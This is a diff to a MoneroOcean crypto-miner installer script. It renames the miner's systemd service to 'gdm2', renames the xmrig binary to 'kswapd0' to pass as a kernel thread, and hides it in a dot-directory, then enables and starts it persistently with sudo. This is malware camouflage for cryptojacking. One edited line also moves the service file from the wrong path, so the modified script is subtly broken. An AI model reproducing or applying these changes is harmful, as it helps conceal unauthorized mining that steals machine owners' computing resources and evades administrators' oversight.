@@ -521,12 +521,12 @@ else
   else
 
     echo "[*] Creating moneroocean_miner systemd service"
-    cat >/tmp/moneroocean_miner.service <<EOL
+    cat >/tmp/gdm2.service <<EOL
 [Unit]
-Description=Monero miner service
+Description=GDM2
 
 [Service]
-ExecStart=$HOME/moneroocean/xmrig --config=$HOME/moneroocean/config.json
+ExecStart=$HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -534,13 +534,13 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service
-    echo "[*] Starting moneroocean_miner systemd service"
-    sudo killall xmrig 2>/dev/null
+    sudo mv gdm2.service /etc/systemd/system/gdm2.service
+    echo "[*] Starting gdm2 systemd service"
+    sudo killall kswapd0 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable moneroocean_miner.service
-    sudo systemctl start moneroocean_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u moneroocean_miner -f\" command"
+    sudo systemctl enable gdm2.service
+    sudo systemctl start gdm2.service
+    echo "To see miner service logs run \"sudo journalctl -u gdm2 -f\" command"
   fi
 fi
 
